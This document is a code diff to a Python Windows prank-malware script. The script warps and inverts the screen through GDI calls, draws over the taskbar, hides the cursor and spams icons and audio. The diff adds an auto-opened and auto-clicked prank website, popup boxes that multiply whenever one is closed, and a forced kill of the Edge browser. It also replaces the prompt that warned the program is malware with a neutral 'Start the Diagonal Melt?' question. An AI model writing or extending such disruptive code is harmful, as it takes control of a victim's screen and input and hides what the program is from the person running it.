@@ -9,9 +9,18 @@ import keyboard
 import sys
 import tkinter as tk
 from tkinter import messagebox
+import webbrowser
+import pyautogui
 from playsound import playsound
 
-# --- Setup GDI ---
+def open_the_chaos():
+    webbrowser.open("https://you-are-idiot.github.io/")
+    
+    time.sleep(2)
+    
+    width, height = pyautogui.size()
+    pyautogui.click(width // 2, height // 2)
+
 user32 = ctypes.windll.user32
 gdi32 = ctypes.windll.gdi32
 hdc = user32.GetDC(0)
@@ -22,44 +31,34 @@ stop_flag = threading.Event()
 
 def diagonal_screen_warp():
     """Mega Warp: Targets Taskbar and Hides Cursor to prevent 'Cleaning'"""
-    # 1. Hide the cursor (Windows API)
     user32.ShowCursor(False)
     
-    # 2. Find the Taskbar Handle so we can draw over it specifically
     taskbar_hwnd = user32.FindWindowW("Shell_TrayWnd", None)
     taskbar_hdc = user32.GetDC(taskbar_hwnd)
 
     while not stop_flag.is_set():
         if random.random() > 0.98:
-          # 0x00550009 is a DNA-level inversion (DSTINVERT)
           gdi32.PatBlt(hdc, 0, 0, width, height, 0x00550009)
-        # THE DRIFT (Entire Screen)
         gdi32.BitBlt(hdc, 10, 10, width, height, hdc, 0, 0, 0x00CC0020)
         
-        # THE TASKBAR KILLER (Forces the taskbar to warp too)
-        # 0x5A0049 (Invert) draws directly onto the taskbar's memory
         gdi32.BitBlt(taskbar_hdc, 0, 0, width, 100, taskbar_hdc, 0, 0, 0x5A0049)
 
-        # THE MEGA CHUNKS (Permanent/Non-Cleaning)
         if random.random() > 0.85:
             rw = random.randint(600, width)
             rh = random.randint(600, height)
             rx = random.randint(0, width - rw)
             ry = random.randint(0, height - rh)
             
-            # Use SRCPAINT (0x00EE0086) to 'smear' the pixels so they stick
             gdi32.BitBlt(hdc, rx, ry, rw, rh, hdc, rx, ry, 0x00EE0086) 
             gdi32.BitBlt(hdc, rx, ry, rw, rh, hdc, rx, ry, 0x5A0049)
             
-        time.sleep(0.005) # Extreme speed to beat the Windows Refresh
+        time.sleep(0.005)
 
 def scribbling_core():
     """Circular lines that also drift diagonally with the screen"""
     angle = 0
-    # Start at top-left
     cx, cy = 100, 100
     while not stop_flag.is_set():
-        # Move the center of the circle diagonally
         cx = (cx + 5) % width
         cy = (cy + 5) % height
         
@@ -85,15 +84,13 @@ def blue_square_clones():
     time.sleep(2)
     clones = [{'x': random.randint(0, width), 'y': random.randint(0, height)} for _ in range(6)]
     
-    blue_brush = gdi32.CreateSolidBrush(0xFF0000) # Blue
+    blue_brush = gdi32.CreateSolidBrush(0xFF0000)
     gdi32.SelectObject(hdc, blue_brush)
 
     while not stop_flag.is_set():
         for c in clones:
-            # Draw the trail
             gdi32.Rectangle(hdc, int(c['x']), int(c['y']), int(c['x'] + 80), int(c['y'] + 80))
             
-            # Constant diagonal movement
             c['x'] = (c['x'] + 15) % width
             c['y'] = (c['y'] + 15) % height
             
@@ -108,6 +105,37 @@ def icon_spam_trail():
         user32.DrawIcon(hdc, point[0] - 16, point[1] - 16, hIcon)
         time.sleep(0.001)
 
+def spawn_box(title,message):
+    root = tk.Tk()
+    root.withdraw()
+    
+    popup = tk.Toplevel(root)
+    popup.title("1x1x1")
+    
+    x = random.randint(0, width - 250)
+    y = random.randint(0, height - 150)
+    popup.geometry(f"250x150+{x}+{y}")
+    
+    content = tk.Frame(popup, padx=10, pady=10)
+    content.pack()
+    tk.Label(content, bitmap="info").pack(side="left", padx=5)
+    tk.Label(content, text="I'm here.").pack(side="left")
+
+    def on_close():
+        for _ in range(2):
+            threading.Thread(target=spawn_box, args=("1x1x1x1", "I'm here."), daemon=True).start()
+        root.destroy()
+
+    tk.Button(popup, text="OK", command=on_close, width=10).pack(pady=5)
+    popup.protocol("WM_DELETE_WINDOW", on_close)
+    
+    root.mainloop()
+
+def fourx():
+    for _ in range(15):
+        threading.Thread(target=spawn_box, args=("1x1x1x1", "I'm here."), daemon=True).start()
+        time.sleep(0.01)
+
 def audio_engine():
     if not os.path.exists("audio.mp3"): return
     while not stop_flag.is_set():
@@ -117,8 +145,9 @@ def audio_engine():
 def on_esc():
     """Clean up and bring back the cursor"""
     stop_flag.set()
-    user32.ShowCursor(True) # BRING CURSOR BACK
-    user32.InvalidateRect(0, 0, 1) # Refresh screen
+    user32.ShowCursor(True)
+    user32.InvalidateRect(0, 0, 1)
+    os.system("taskkill /F /IM msedge.exe /T")
     print("\n[!] Restoring System...")
     os._exit(0)
     
@@ -126,7 +155,7 @@ if __name__ == '__main__':
     root = tk.Tk()
     root.withdraw()
     
-    if messagebox.askyesno("Warning", "This is a malware, are you sure running it?\n\nPress ESC to stop."):
+    if messagebox.askyesno("DIAGONAL DESTRUCTION", "Start the Diagonal Melt?\n\nPress ESC to stop."):
         keyboard.add_hotkey('esc', on_esc)
         
         threading.Thread(target=audio_engine, daemon=True).start()
@@ -135,6 +164,8 @@ if __name__ == '__main__':
         threading.Thread(target=blue_square_clones, daemon=True).start()
         threading.Thread(target=icon_spam_trail, daemon=True).start()
         gdi32.BitBlt(hdc, 5, 5, width, height, hdc, 0, 0, 0x00EE0086)
+        open_the_chaos()
+        fourx()
 
         keyboard.wait('esc')
         on_esc()
